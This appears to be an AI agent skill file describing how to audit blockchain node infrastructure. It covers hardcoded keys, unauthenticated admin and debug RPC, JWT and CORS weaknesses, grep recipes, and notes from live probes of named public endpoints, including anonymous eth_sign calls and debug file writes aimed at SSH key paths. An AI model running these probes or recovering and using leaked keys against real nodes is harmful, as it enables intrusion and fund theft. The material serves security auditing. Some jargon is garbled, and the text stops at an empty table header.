---
name: blockchain-node-audit
description: "node implementation audit"
---

# Blockchain Node Infrastructure Audit

## What This Covers

Smart contract audits check contract logic. Node audits check the **software that runs the chain** — execution clients (reth, ethrex, geth), consensus clients, RPC gateways, admin APIs, sequencer control planes, and Docker deployment configs.

The attack surface is fundamentally different:
- **CLI frameworks** with hardcoded default values (private keys, addresses, secrets)
- **Admin HTTP servers** bound to localhost-by-default but often reconfigured to 0.0.0.0
- **Engine API auth** (JWT between consensus ↔ execution) with weak or disabled validation
- **Docker Compose configs** that expose internal ports, mount secrets, or leak env vars
- **Snapshot/backup scripts** that touch sensitive data
- **Metrics endpoints** that leak internal state

## When to Use

Reach for this skill when:
- Auditing a blockchain project's node software (GitHub repo with Rust/Go/C++ client code)
- Reviewing deployment templates (Docker Compose, Kubernetes, systemd)
- Checking RPC endpoint security (public JSON-RPC, Engine API, admin endpoints)
- Auditing L2 sequencer infrastructure (batch submitters, proof coordinators, committers)
- Hunting for operator-level takeover (not user-level, not contract-level)

## Core Hunting Patterns

### 1. Hardcoded Defaults in CLI Parsers

The #1 finding class. CLI frameworks (clap in Rust, cobra in Go) allow `default_value` attributes. Developers often hardcode:
- Private keys for committers, sponsors, proof coordinators
- JWT secrets or auth tokens
- Admin addresses (coinbase, fee recipient)
- Remote signer URLs

**Where to look:**
- `cmd/` or `bin/` directories — CLI entry points
- `options.rs`, `flags.rs`, `config.rs`, `args.rs`
- Search: `default_value`, `default_value_t`, `env =`, `Arg::new`
- Search: `private_key`, `secret`, `jwt`, `auth`, `password`

**Why it matters:** If the default is in source, every deployment that doesn't override it uses the same key. An attacker who reads the repo can derive the address and sign as the operator.

### 2. Unauthenticated Admin/Sequencer Endpoints

Node software often ships with internal HTTP servers for operational control:
- Start/stop committers, batch submitters, proof coordinators
- Freeze/restart state machines
- Adjust block production parameters
- Health and metrics endpoints

**Where to look:**
- `admin_server.rs`, `admin_api.go`, `sequencer/mod.rs`
- Search: `Router::new()`, `axum`, `warp`, `actix`, `gin`, `echo`
- Search: `route(`, `.get(`, `.post(`, `handle_`
- Check for auth middleware: `middleware`, `layer`, `auth`, `token`, `jwt`

**Red flag:** Routes registered with `.with_state()` but no `.layer(auth_middleware)`.

### 3. Engine API JWT Weaknesses

Consensus ↔ execution communication uses JWT auth (EIP-3675). Common weaknesses:
- `validate_exp = false` — expired tokens accepted forever
- Only `iat` claim checked, no `exp` validation
- Static secrets in files accessible to non-root users
- JWT secret transmitted in env vars or mounted volumes

**Where to look:**
- `authentication.rs`, `auth.rs`, `jwt.rs`, `engine_auth`
- Search: `validate_exp`, `Validation::new`, `decode::<Claims>`
- Search: `jwt_secret`, `jwt.hex`, `authrpc.jwtsecret`

### 4. Permissive CORS on RPC

Public RPC endpoints sometimes enable `CorsLayer::permissive()` or `Access-Control-Allow-Origin: *`. This allows any website to make authenticated requests on behalf of a connected wallet (if the user has an active session).

**Where to look:**
- RPC server setup code
- Search: `CorsLayer`, `cors`, `Access-Control`, `allow_origin`

### 5. Deployment Config Exposure

Docker Compose and Kubernetes configs reveal:
- Internal port mappings (admin APIs, metrics, P2P)
- Volume mounts for secrets (JWT files, keystores)
- Environment variable names (even if values are in `.env.secret`)
- Trusted peer lists (internal node addresses)
- Snapshot download scripts (S3 bucket names, regions)

**Where to look:**
- `docker-compose.yml`, `compose.yml`, `k8s/`, `helm/`
- `.env`, `.env.example`, `.env.secret.example`
- `scripts/download-snapshot.sh`, `scripts/use.sh`
- `config/` directories with per-network configs

## Audit Workflow

### Phase 1: Repo Recon
1. Clone the node repo (use GitHub API tarball if git HTTPS unavailable)
2. Count files by language — identify the client implementation
3. Map directory structure: `cmd/`, `crates/`, `pkg/`, `config/`

### Phase 2: Secret Hunt
1. Grep for private key patterns in source
2. Check CLI default values for hardcoded secrets
3. Derive addresses from any found keys
4. Check `.env.example` files for leaked variable names

### Phase 3: Endpoint Mapping
1. Find all HTTP server setups (axum, warp, gin, etc.)
2. List every registered route
3. Check each route for auth middleware
4. Identify admin/operational endpoints

### Phase 4: Auth Deep-Dive
1. Find JWT/auth implementation
2. Check expiration validation
3. Check required claims
4. Check secret loading mechanism

### Phase 5: Deployment Review
1. Read Docker Compose / K8s configs
2. Check port exposures
3. Check volume mounts for secrets
4. Check env var handling

## Output Format

Same as other audit skills:
```
VULNERABILITY: [Class]
ENTRY: [Pre-auth / Post-auth / Unauth]
CHAIN: [Step 1 → Step 2 → ... → Impact]
IMPACT: [Node takeover / Chain halt / Key theft / DoS]
POC: [Working exploit script]
EVIDENCE: [File:line references]
CONFIDENCE: [PROVEN / HIGH / THEORETICAL]
MITIGATION: [Root cause + Fix]
```

## Key Differences from Smart Contract Audits

| Aspect | Smart Contract | Node Infrastructure |
|--------|---------------|---------------------|
| Target | Solidity/Vyper contracts | Rust/Go/C++ client code |
| Entry | Contract calls, txs | HTTP endpoints, CLI args, configs |
| Secrets | Storage slots, private keys in contracts | CLI defaults, env vars, mounted files |
| Auth | Contract-level access control | HTTP middleware, JWT, mTLS |
| Impact | Fund theft, logic manipulation | Chain halt, operator impersonation, DoS |
| PoC | Foundry/Hardhat script | curl/Python against HTTP endpoint |

## Common Pitfalls

- **Confusing testnet/mainnet scope** — A key hardcoded in testnet config is NOT mainnet-critical. Verify which network the affected code path serves.
- **Assuming localhost binding = safe** — Docker `ports:` mappings override localhost binding. `127.0.0.1:8545` in compose becomes `0.0.0.0:8545` if `ports` exposes it.
- **Ignoring deployment-dependent vulns** — Hardcoded keys are source-level bugs. Whether they're exploitable depends on whether the operator overrode defaults. Report as "proven-in-code" with deployment conditions.
- **Missing the chain impact** — Node vulns don't just affect one node. A compromised sequencer affects the entire chain's liveness and safety.
- **EIP-7702 delegation as proof of key usage** — If a hardcoded key's address is an EIP-7702 delegated account (23-byte code: `0xef0100` + 20-byte addr), the key is **actively used** in production. The delegated contract may have `execute(address,uint256,bytes)` (selector `0xb61d27f6`) — a smart contract wallet pattern. See `examples/hunts/web3/blockchain-node-audit/references/plasma-ethrex-hardcoded-keys.md`.
- **Devnet discovery via DNS brute force** — Custom chain devnets are discoverable via subdomain patterns: `devnet.<domain>`, `testnet.<domain>`, `staging.<domain>`, `cs-<N>.<domain>`, `observer-cs-<N>.<domain>`, `validator-cs-<N>.<domain>`. Devnets often have **weaker security** — debug APIs, admin endpoints, txpool access may be enabled. Detect: DNS resolve → port scan → JSON-RPC probe. See `examples/hunts/web3/blockchain-node-audit/references/plasma-ethrex-node.md`.
- **Treasury addresses in genesis** — Genesis files pre-fund treasury/operator addresses. These are public (in genesis JSON) and may hold millions in native tokens. Check `config/*/genesis.json` → `alloc` section. Derive addresses and check on-chain balances. If any treasury key is derivable, it's a direct fund extraction vector. See `examples/hunts/web3/blockchain-node-audit/references/plasma-ethrex-node.md`.
- **Consensus config leaks** — Node template configs (`node-templates/config/*/non-validator.toml`) leak: BLS public keys (static committee), bootstrap node hostnames + peer IDs, validator hostnames (even in comments), engine API URLs, JWT secret paths, P2P ports, consensus API ports. Enables targeted scanning of validator infrastructure. Detect: grep for `bls_public_key`, `bootstrap_nodes`, `trusted_peers`, `engine_api_url`. See `examples/hunts/web3/blockchain-node-audit/references/plasma-ethrex-node.md`.
- **Node-contract EVM bypass pattern (Geth-fork DEX)** — Some geth-fork DEX implementations (Viction/TomoChain TomoX) route trading/lending transactions to `ApplyEmptyTransaction()` which does NOT execute EVM bytecode. Instead, the node directly reads/writes contract storage via `statedb.GetState()`/`SetState()`, bypassing all Solidity modifiers (`onlyActiveRelayer`, `relayerOwnerOnly`, etc.). Detection: grep `core/state_processor.go` for `ApplyEmptyTransaction` + `TradingStateAddr`/`LendingAddress`. Impact: validator can manipulate relayer fees, user balances, order matching, liquidations without contract code execution. State root validation is circular (both roots from same node code). Audit the node Go code, not the Solidity contracts — the contracts are legacy wrappers. See `examples/hunts/web3/blockchain-node-audit/references/viction-node-audit-2026-08.md` for full analysis.
- **Geth-fork TomoX/TomoChain pattern (Viction 2026-08)** — Orderbook DEX as go-ethereum fork extensions: `consensus/posv/` (Proof-of-Stake-Voting), `tomox/` (trading engine), `tomoxlending/` (lending engine), `contracts/` (Solidity 0.4.24 relayer contracts). Key sinks: `order_processor.go` matching engine (division by zero on `makerPrice==0`), lending `processOrderList` (liquidationRate overflow → mass liquidation), tradingstate DB (nonce wrap at 2^64). Contracts have reentrancy in `Registration.refund/buyRelayer`, issuer-controlled collateral pricing in `LendingRegistration`, `selfdestruct` penalty in `chequebook`. **Debug API arbitrary file-write**: `internal/debug/api.go:writeProfile` → `os.Create(expandHome(file))` pre-auth if `debug` in `HTTPModules`. See `examples/hunts/web3/blockchain-node-audit/references/viction-node-audit-2026-08.md` for full trust graph, tarball fallback recipe (broken `git-remote-https`), live probe matrix, and node-contract bypass analysis.
- **Health endpoint leaks internal state** — Admin server `/health` endpoints often leak: signer address, on-chain proposer address, chain ID, committer status, last committed batch, validium/based mode. Even if admin routes aren't directly exploitable, the health endpoint is a reconnaissance goldmine. See `examples/hunts/web3/blockchain-node-audit/references/plasma-ethrex-hardcoded-keys.md`.
- **Gin REST `Open`/`Secured` confusion and `isFoundInConfig` fallback-open** — MultiversX Gin nodes split route gates: `ApiRoutesConfig.APIPackages[].Routes[]{Name,Open}` (chain-go, no auth field) vs `{Name,Open,Secured,RateLimit}` (proxy-go, `Secured`→BasicAuth via `gin.Accounts`+SHA256 `hasher.Compute`). `baseGroup.RegisterRoutes` only checks `isOpen`; proxy adds `isSecured→authenticationFunc`. If `!isFoundInConfig` proxy **still registers the handler with no auth and only a Warn log** (`api/groups/baseGroup.go:94-97`): `log.Warn("endpoint not found in config"); ws.Handle(path, handler)`. Chain-go has **no `Secured` field at all** — every `Open=true` route is unauth by design plus `cors.Default()` (`AllowAllOrigins:*`, `api/gin/webServer.go:101`, `proxy/api/api.go:34`). Audit: `grep -rn "RegisterRoutes|APIPackages|RouteConfig|Secured|isFoundInConfig|cors\.Default|pprof\.Register" api/ config/ data/`. See `examples/hunts/web3/blockchain-node-audit/references/multiversx-gin-rest-redteam-2026-08.md`.
- **Conditional pprof/Prometheus as unauth debug** — Both codebases guard `pprof.Register` and `promhttp.Handler` **only on facade flags**, not on route `Open`: chain-go `api/gin/webServer.go:230-236` `if ws.facade.PprofEnabled(){pprof.Register}` / `if P2PPrometheusMetricsEnabled(){GET /debug/metrics/prometheus}` (`FacadeConfig{PprofEnabled,P2PPrometheusMetricsEnabled}` `config/config.go:327`); proxy `api/api.go:131` `if isProfileModeActivated{pprof.Register(ws)}` (global, no version prefix, no auth). `api.toml` enables `/log` WS (`CheckOrigin: return true`, `api/gin/common.go:82-84`) and all 11 groups `Open=true`; `v1_0.toml` only 4/70 routes `Secured=true` (`/actions/reload-observers|reload-full-history-observers`, `/network/direct-staked-info|delegated-info`). When flags true, full pprof (`/debug/pprof/*`, `trace?seconds=`, `profile`) leaks heap/goroutine/cmdline pre-auth. Always check `prefs.toml`/`config.toml` and `cmd/proxy/main.go` flag. See same reference.
- **Pre-auth VM execution is the RCE-adjacent surface** — `/vm-values/query|hex|string|int` (`VMValueRequest{ScAddress,FuncName,Args hex[],CallerAddr,CallValue,SameScState,ShouldBeSynced}` → `createSCQuery` hex-decodes each arg, `big.NewInt(0).SetString(CallValue,10)` no upper bound, `ExecuteSCQuery` runs Wasmer) and `/transaction/simulate|send` (`ShouldBindJSON` → `SimulateTransactionExecution`) execute WASM on live trie **pre-auth, no funds/sig**. `FuncName` not allowlisted, `Args` arbitrary length. Any `mx-chain-vm-go`/`wasmer2` bug = instant pre-auth RCE. Fuzz these first. Same tier: `POST /hardfork/trigger` (`HardforkRequest{Epoch,WithEarlyEndOfEpoch}` → `node.DirectTrigger`) and `POST /node/debug` (`QueryDebugRequest{Name,Search}` → `GetQueryHandler(name).Query(search)`) are unauth consensus/debug primitives. See same reference.
- **Beacon-kit Beacon API is unauthenticated by design (Echo, no auth middleware, wildcard CORS)** — `node-api/middleware/middleware.go:29-40` `NewDefaultMiddleware` only installs `CORSWithConfig(DefaultCORSConfig)` + `CustomValidator`; zero `auth`/`jwt`/`bearer` middleware (`grep -rn auth node-api/` returns only mocks). `node-api/server/server.go:80-97` `RegisterRoutes` for `beaconapi`/`debugapi`/`proofapi`/`cometbftapi` has no guard. Default `127.0.0.1:3500` (`node-api/server/config.go:24`) mitigates, but operators enabling `0.0.0.0` expose 60+ routes (`/eth/v1/beacon/*`, `/eth/v2/debug/*`, `/cometbft/v1/*`, `bkit/v1/proof/*`) — all `grep POST|GET` in `handlers/beacon/routes.go` are unauth, most state-mutating are `Deprecated`/`NotImplemented` stubs which limits impact to enumeration/DoS. Still treat as **HIGH** when `Enabled:true` + non-loopback. Detect: `grep -rn "CORSWithConfig\|CustomValidator\|RegisterRoutes" node-api --include="*.go"`. See `examples/hunts/web3/blockchain-node-audit/references/beacon-kit-polaris-redteam-2026-08-15.md`.
- **Debug full-SSZ state dump + proof DoS** — `GET /eth/v2/debug/beacon/states/:state_id → GetState` (`node-api/handlers/debug/state.go:15-35`) does `StateAndSlotFromHeight` → `GetMarshallable()` → returns `StateResponse{Data: beaconState, Finalized:true, ExecutionOptimistic:false}` full SSZ, no auth/pagination/cache. `bkit/v1/proof/{block_proposer,validator_pubkey,validator_credentials,validator_balance}/:timestamp_id/:validator_index` (`node-api/handlers/proof/routes.go:20-40`) each call `merkle.Prove*InBlock` (SSZ merkleization) — expensive, spam `timestamp_id=head` to burn CPU; debug dumps validator set/balances for MEV targeting. Detect: `grep -rn "GetState\|Prove.*InBlock" node-api --include="*.go"`. See `examples/hunts/web3/blockchain-node-audit/references/beacon-kit-polaris-redteam-2026-08-15.md`.
- **Engine JWT is client-only; nil `JWTSecret` panics** — `primitives/net/jwt/jwt.go:78` `BuildSignedToken` is `HS256 {iat: now}` only (no `exp`, no `none` alg — not bypassable with `none`). `execution/client/ethclient/rpc/header.go:27` `rpc.jwtSecret.BuildSignedToken()` dereferences nil without check → panic if `JWTSecret` missing. `node-core/components/engine.go:42` `JWTSecret *jwt.Secret optional:"true"` + `components/jwt_secret.go:42` `ProvideJWTSecret` errors on missing file but depinject may inject `nil` → `ethclientrpc.NewClient(nil)` → `Initialize()` panics → crash loop. `polaris/cosmos/config/config.go:471` reads `polaris.node.jwt-secret` into `conf.Node.JWTSecret` (embedded `node.Config`) but no wiring to geth `node.Config.JWTSecret` found; template default empty (`cosmos/config/template.go:297` `jwt-secret = ""`, `e2e/testapp/docker/local/config/app.toml:497` `jwt-secret = ""`) → auth RPC may run without JWT validation → Engine API auth bypass if `auth-addr` non-loopback. Detect: `grep -rn "JWTSecret.*optional\|ProvideJWTSecret\|jwtSecret" --include="*.go" | grep -v pb`. Same reference.
- **Polaris geth defaults to wildcard CORS and `0.0.0.0` bind** — `eth/node/node.go:68-78` `DefaultGethNodeConfig()`: `HTTPHost="0.0.0.0"`, `WSHost="0.0.0.0"`, `HTTPCors=["*"]`, `WSOrigins=["*"]`, `HTTPVirtualHosts=["*"]`; `nodeCfg.HTTPModules` appends `eth,txpool`. Combined with `cosmos/config` user-controlled `HTTPModules`/`AuthAddr` → any site can `fetch(http://victim:8545)` `eth_sendTransaction`/`personal_unlockAccount` if enabled. Detect: `grep -rn "DefaultGethNodeConfig\|HTTPHost\|HTTPCors\|WSOrigins" eth --include="*.go"`. Same reference.
- **Engine API confusion: beacon-kit has no Engine server to hijack** — beacon-kit `execution/client/ethclient/engine.go` only **calls** `engine_newPayloadV*`/`forkchoiceUpdatedV*`/`getPayloadV*` via `rpc.Client.Call`; there is no `engine_*` route / JSON-RPC server in beacon-kit. Forkchoice/auth-bypass hunting should target bera-reth (Rust `jsonrpsee` `BerachainEngineApi` `new_payload_v4_p11` etc.), not beacon-kit Go. Avoid false `engine/` admin findings. Detect: `grep -rn "engine_newPayload\|forkchoiceUpdated" execution --include="*.go"` = client, vs `grep -rn "new_payload_v4_p11\|BerachainEngineApi" bera-reth --include="*.rs"` = server. Same reference.
- **Geth-fork `debug_write*` is file-write DoS, not RCE, unless writable exec path** — `internal/debug/api.go:writeProfile` does `os.Create(expandHome(file))` + `p.WriteTo(f,0)` — content is fixed pprof binary, not attacker string. Always probe live: `debug_writeMemProfile /tmp/pwn` vs `/root/.ssh/authorized_keys` — validator non-root → permission denied, only `/tmp`/`/var/tmp`/`/dev/shm` succeed. Do not claim RCE; classify as **HIGH arbitrary file write + info leak**. Only escalates to RCE if node runs as root (cron write) or datadir is world-writable and pprof content can be sprayed. Companion `debug_stacks`/`debug_memStats`/`debug_verbosity` leak as info-disclosure amplifiers. Detect: `grep -rn "writeProfile\|expandHome" internal/debug --include="*.go"` + live `curl rpc_modules` then `debug_writeMemProfile` matrix. See `references/geth-debug-rpc-file-write-vector.md`.
- **Bytecode analysis for reentrancy detection (Viction 2026-08)** — When source code is unavailable or you need to verify deployed bytecode matches source, use bytecode analysis to detect reentrancy vulnerabilities. Key patterns: (1) **No CALLVALUE (0x34)** = no direct ETH transfer via CALL = classic DAO-style reentrancy NOT possible; (2) **SSTORE before CALL** = Checks-Effects-Interactions pattern mitigates reentrancy even without explicit guard; (3) **PUSH1 0x00 before CALL** = value parameter is 0 = no ETH transfer; (4) **High DELEGATECALL count (20+) with no CALLVALUE** = library calls, not direct transfers. Quick assessment: `delegatecall_count = code.count('f4'); has_callvalue = '34' in code; if not has_callvalue and delegatecall_count > 20: return "LOW — Library-heavy, no direct ETH transfer"`. Always verify with live `eth_call` before claiming drain feasibility. See `examples/hunts/web3/blockchain-node-audit/references/viction-bytecode-reentrancy-analysis-2026-08.md`.
- **Code-level `debug` exposure ≠ live exposure — always live-probe `rpc_modules`** — `go-abey` code registers `debug.Handler` + `HTTPModules=[abey,eth,impawn,shh]` plus `--singlenode` forces `personal,admin,miner` but live `rpc.bchscan.io` returned `rpc_modules=[debug,eth,net,rpc,web3]` and `personal_*` → `-32601 does not exist`. Must enumerate live modules (`eth_rpcModules`/`rpc_modules`) before claiming singlenode total-compromise; devnet may differ from mainnet. Same detection as above.
- **`eth_accounts` leaks wallet addresses even when `personal_*` is gated** — Viction live probe (2026-08-16): `rpc.viction.xyz` returned `eth_accounts` → `["0x3e03bc621579b2cc6b9d2aeb2691896471ccf905"]` while `personal_*`, `admin_*`, `debug_*` all returned `-32601`. `eth_accounts` is part of the `eth` namespace (almost always enabled on public RPC) and reveals node-managed account addresses without authentication. Impact: enables targeted phishing, balance tracking, tx history analysis of operator wallets. Add `eth_accounts` to live probe matrix; if it returns non-empty array, flag as MEDIUM info-leak even if all private namespaces are gated. See `examples/hunts/web3/blockchain-node-audit/references/viction-live-rpc-probe-2026-08.md`.
- **`eth_coinbase` + `eth_sign` → CRITICAL operator impersonation, not just MEDIUM info-leak (MultiVAC 2026-08-17)** — MultiVAC live probe: `eth_accounts == eth_coinbase == "0x2781bcb..."` PLUS `eth_sign("0xdeadbeef")` returned a valid 65-byte signature to an anonymous caller; `eth_signTransaction` returned `-32000: nonce not specified` (method enabled); `eth_sendTransaction` returned `-32000: insufficient funds for gas * price + value` (method enabled — funding enables drain). `eth_mining=false` and latest block had `miner=0x000...0 + gasUsed=0` (custom PoA-style — `eth_coinbase` was the only way to identify the real operator because the EVM layer is an inert view). **Classification rule:** probe `eth_accounts` → `eth_coinbase` → `eth_sign`, `eth_signTransaction`, `eth_sendTransaction` in sequence. If `eth_accounts` is non-empty AND any of the three wallet methods returns anything other than `-32601 does not exist`, escalate from MEDIUM info-leak to **CRITICAL operator impersonation capability** (the node runs with the operator key unlocked, not just wallet-aware). If `eth_coinbase` returns `0x0` the etherbase is set to null — the real block producer may be BLS/Tendermint/BTC-style outside the EVM layer; `eth_coinbase` still leaks the operator identity. See `examples/hunts/web3/blockchain-node-audit/references/multivac-ecosystem-trust-graph-2026-08-17.md`.
- **Genesis private keys committed as integer byte arrays (MultiVAC 2026-08-17)** — MultiVAC `model/chaincfg/genesis/generated_privatekeys.go` commits per-shard GENESIS PRIVATE KEYS as Go byte-literal arrays, not hex strings: `signature.PrivateKey<redacted byte-array key material>`. Companion `reduceprivatekey.go` has a single hardcoded reduce-signing key as a 64-byte array. ~128 testnet keys were concatenated hex strings (matches the standard regex already documented). **Detection — add these regex to the secret-hunt grep set** (existing skills miss the byte-array form): `grep -rEn 'PrivateKey\{[^}]*[0-9]+(,[0-9]+)+\s*,?\s*\}' --include='*.go' .` + `grep -rEn 'var\s+\w*[Pp]rivate[Kk]ey\s*=' --include='*.go' .` + `grep -rEn '(genesis|reduce|sign|wallet)\w*[Pp]rivate[Kk]ey\s+=[^0-9"]*[0-9]' --include='*.go' .`. Once caught, extract the array bytes, `bytes([...]).hex()` to recover the hex private key, derive the address via the standard curve, check against on-chain balance/staking to confirm whether the leaked key is in active use. See same reference.
- **Static-salt scrypt keystore — third subclass of keystore weakness (MultiVAC 2026-08-17)** — MultiVAC `Offline-Tools/keystore/keystore.go` used `scrypt(N=32768, r=8, p=1, salt=[]byte("MultiVAC") as a fixed string literal)`. N is 8× weaker than Ethereum V3 keystore default (262144). **Static salt means identical password → identical KEK across every keystore on the chain** — precomputed-dictionary-table attack reusable against every keystore at once. Add **'static-salt scrypt'** as a third subclass alongside (a) hardcoded passwords and (b) weak KDF params. Detect: `grep -rEn 'scrypt\.Key\(' --include='*.go' .` then inspect surrounding salt — flag whenever `salt :=\s*\[\]byte\("` produces a fixed literal. See same reference.
- **Per-chain contract-address dispatch in explorer DApp JS (MultiVAC 2026-08-17)** — MultiVAC `e.mtv.ac` explorer JS contains a `getContractAddress()` that returns a different contract per connected chain: chain ID 1 → `0x6226...77f` (ERC-20 MTV on Ethereum), chain ID 56 → `0x8aa6...ef1` (BEP-20 MTV on BNB), chain ID 62621 (MultiVAC mainnet) → `0x0000...16ee` (native staking target). The MetaMask `wallet_addEthereumChain` config and the ERC-20 ABI literal array (`["function name() view returns (string)", "function symbol() view returns (string)", "function balanceOf(address) view returns (uint)", "function transfer(address to, uint amount)", "event Transfer(address indexed from, address indexed to, uint amount)"]`) are also hardcoded literals. **Add this pattern to Phase 1 recon for multi-chain ecosystems**: grep the explorer bundle for `chainName`, `wallet_addEthereumChain`, the ERC-20 ABI literal array — once matched, scroll back to extract per-chain contract-address conditionals, then verify each contract `eth_getCode` against the relevant chain's RPC. Common on chains with an official multi-chain桥 DApp (MultiVAC, Viction, TomoChain, ABEY). Same reference.
- **BCH vs ABEY scope confusion (chainId gate)** — `rpc.bchscan.io:6060` returns `chainId 0x17ac=6060` (BCH fork) while `AbeyFoundation/go-abey` is `params/config.go:MainnetChainConfig ChainID 179 (0xb3)` / `Testnet 178 (0xb2)` + `README 19330/18928/400` legacy + `rpc.abeychain.com 0xb3` / `testrpc 0xb2`. Probing `6060` and claiming ABEY `debug` RCE = false positive. Gate: always `eth_chainId`/`net_version` must match `params/config.go` before reporting; `documents/README.md:9` lists `https://rpc.abeychain.com` + `https://testrpc.abeychain.com` as ground truth.
- **Go toolchain mismatch `pollCopyFileRange` redeclared (Go 1.23 vs 1.22)** — `go-abey go.mod: go 1.22.0` + `build/env.sh` GOPATH workspace fails on `go1.23` (`os/zero_copy_linux.go` vs `os/readfrom_linux.go` redeclared `pollCopyFileRange/pollSplice/wrapSyscallError/readFrom`). Fix: `GOTOOLCHAIN=go1.22.0 go version` + `export PATH=/root/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.22.0.linux-amd64/bin:$PATH` then `make gabey` → `build/bin/gabey 35M`. Do not patch `os` stdlib; pin toolchain. Detect: `grep -n pollCopyFileRange /usr/local/go/src/os/*.go` on failure.
- **Explanation-first + `sawntai` warung reporting (operator preference)** — User rejects fragmented `acaka adut` dumps. Always: 1) concept BEFORE `curl` (FIRST PRINCIPLES: claim vs actual vs assumptions), 2) `warung` analogy tables (`Dapur/Pusat/Spanduk/Kasir/Kurir/Brankas` → `debug/Handler/rpc/http.go/ExportChain/wallet Base_Url/bftkey`), 3) `1 dapet apa 2 dapet apa` tables, short paragraphs, casual Indonesian tone, 4) honest `PROVEN-live` (`result:null`+`ls`) vs `PROVEN-in-code` vs `THEORETICAL` + `bchscan EXCLUDE` disclaimer. Embed in skill body, not just memory.
- **Distinguishing static SPA route vs real API before injection testing (MultiVAC 2026-08-17)** — When probing unknown blockchain frontends, the response pattern classifies the endpoint: (a) `200` + `size_download=0` + empty body for ANY payload = static SPA route — stop injection testing; (b) `200` + valid JSON that is byte-identical regardless of input = real API that ignores the body (e.g. MultiVAC `POST /summary` always returned latest block stats no matter what you sent — no injection surface); (c) `302 → error.html` + `Allow: GET, HEAD` = route registered but no POST handler; (d) `200` + JSON varies with input = real API — continue testing. Test all three injection classes (SQLi/NoSQL/SSTI) with one payload each and compare md5 of responses before doing deep payload mutation. **Failure mode**: wasting 12 probes testing SSTI against a route that has no server-side code. See `examples/hunts/web3/blockchain-node-audit/references/multivac-redteam-agent2-2026-08-17.md` §A.
- **Path traversal that normalizes to `/` is NOT exploitable when the served content is already public (MultiVAC 2026-08-17)** — nginx normalizes `/api/../` to `/` (path-as-is), `/api/%2e%2e/` to `/` (CF decodes), and `/api/..%2f` to `/`. If the traversed path serves a public homepage that you could `GET /` directly anyway, the access control has NOT been bypassed — there was never a backend behind `/api/` to reach. The exploitability test: does the traversed path serve content that the direct path would have **denied access to** AND is that content sensitive/dynamic? Before declaring "path traversal bypass successful", confirm the served content is actually new and restricted. Recipes + verdict table: `examples/hunts/web3/blockchain-node-audit/references/multivac-redteam-agent2-2026-08-17.md` §B.
- **Test-fixture private keys and seed phrases in Go test files are a committed-secret leak class (MultiVAC 2026-08-17)** — Distinct from the `default_value` hardcoded-default pattern and the genesis byte-array pattern. Go projects with wallet tooling commit deterministic real-format private keys and BIP39 mnemonics to `*_test.go` as test vectors. MultiVAC's `Offline-Tools/mnemonic/mnemonic_test.go` had two 24-word mnemonics + expected pubkey/privkey; `keystore_test.go`, `account_test.go`, `signature_test.go` had 6+ hardcoded 128-hex-char private keys. Because BIP39 derivation is deterministic, the same mnemonic always maps to the same keys — if a developer reused one as a real wallet, the account is drainable. **Grep recipes**: `grep -rEn '(mnemonic|seedPhrase|seedWords?)\s*[:=]\s*"[a-z]{4,}' --include='*_test.go'.` for mnemonics, `grep -rEn '\b[a-fA-F0-9]{128}\b' --include='*_test.go'.` for 128-char private keys, `grep -rEn '(passwd|password)\s*[:=]\s*"[^"]{4,32}"' --include='*_test.go'.` for hardcoded test passwords. Audit step: derive the address from each leaked test key, then `eth_getBalance` against the chain RPC. See `examples/hunts/web3/blockchain-node-audit/references/multivac-redteam-agent2-2026-08-17.md` §E.
- **CORS preflight-vs-actual dual test and Cloudflare/nginx Server header inversion (MultiVAC 2026-08-17)** — (1) Test both OPTIONS preflight AND actual GET with evil Origin. Cloudflare blocks preflight with 403, but actual request may return 200 — the response is only vulnerable if `Access-Control-Allow-Origin` is present in the actual response. Absent ACAO = CORS properly configured even when actual request returns 200. (2) The `Server` response header inverts depending on which layer handled the request: `Server: cloudflare` on a 403 = CF rejected at the edge (`Host: localhost` test triggered this); `Server: nginx/1.20.1` on a 403 = origin nginx is enforcing the access control. This tells you which WAF layer to target for bypass attempts. Recipes: `examples/hunts/web3/blockchain-node-audit/references/multivac-redteam-agent2-2026-08-17.md` §C and §D.

## Gin REST Audit Workflow (extends Phase 3: Endpoint Mapping)

When the node uses Go `gin` (MultiversX, Cosmos SDK gin, Ethermint):

1. **Map registration:** `api/gin/webServer.go:createGroups()` → 11 groups (chain-go) / `api/api.go:registerRoutes` → versioned `/v1.0/<pkg>` (proxy). Each `groups/*Group.go:New*Group` declares `[]*shared.EndpointHandlerData{Path, Method, Handler, AdditionalMiddlewares}`. Grep `EndpointHandlerData` to enumerate all 60-70 routes in one pass.
2. **Extract gate truth:** `config/config.go:ApiRoutesConfig{APIPackages map[string]APIPackageConfig{Routes []RouteConfig}}` + `cmd/node/config/api.toml` (chain-go, `Name`+`Open` only) vs `data/api.go:RouteConfig{Name,Open,Secured,RateLimit}` + `cmd/proxy/config/apiConfig/v1_0.toml` (proxy, adds `Secured`). `baseGroup.getEndpointProperties` is the single gate — read it.
3. **Check auth middleware gaps:** `grep -rn "Auth|BasicAuth|jwt|Bearer|middleware.*Auth" api/` → chain-go must return **zero** (only throttlers). Proxy `getAuthenticationFunc` only wired when `isSecured==true`. Count `Secured=true` (4/70) — the rest are unauth by design.
4. **Flag-gated debug sinks:** Search `pprof.Register`, `promhttp`, `cors.Default`, `static.ServeRoot`, `CheckOrigin`. All four are pre-auth when enabled: pprof/Prometheus on flags, CORS `*` always, swagger `static.ServeRoot("/", "config/swagger")` when `shouldStartSwaggerUI`, log WS `CheckOrigin:true`.
5. **Sink hunt for RCE:** `grep -rn "os\.Exec|exec\.Command|syscall|template\.|filepath\.|ioutil\.ReadFile|multipart\.FormFile" api/ | grep -v swagger-ui-bundle`. Expect **no** RCE sinks; the RCE-adjacent sinks are `ExecuteSCQuery`/`SimulateTransactionExecution` (Wasmer) and `Trigger`/`GetQueryHandler`. Prioritize fuzzing `vm-values` with malformed hex Args, huge CallValue, `SameScState` toggle.
6. **Proxy forwarding SSRF check:** Read `process/baseProcessor.go:CallGetRestEndPoint(address+path)` + `CallPostRestEndPoint`. Verify `address` is `observer.NodesProvider` (shard-selected, not user) vs user-controlled host. Raw `address+path` concat with no `url.Parse` is safe against arbitrary-host SSRF but vulnerable to poisoned observer config (second-order). Rate-limit this as architecture finding, not critical SSRF.

## Deploy-Ops Weakness Audit (AElf / Sisir Pattern)

Seven-point checklist for `AElf.Launcher` + ebridge-contracts style repos where the on-chain contract is pure but the launcher ships deploy configs.

| # | Check | File:line Anchor | Grep | What is Weak |
|---|-------|------------------|------|--------------|
